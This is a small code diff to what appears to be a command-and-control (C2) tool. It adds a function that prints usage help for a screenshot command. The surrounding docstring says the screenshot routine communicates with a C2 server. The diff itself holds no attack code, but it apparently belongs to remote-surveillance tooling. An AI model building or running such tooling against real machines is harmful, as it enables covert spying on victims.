@@ -11,6 +11,20 @@ SCREENSHOT = 5
 
 '''
 Description:
+    Prints screenshot usage for user 
+Params:
+    N/A
+Returns:
+    SUCCESS or FAILURE 
+'''
+def printScreenshotHelp():
+    print("""Required params: \n
+                -filepath - Path where we would like to write our screenshot to locally \n""")
+    return SUCCESS
+
+
+'''
+Description:
     Performs screenshot functionality; communicates with C2 server and handles responses
 Params:
     sock - sock object with connection already established
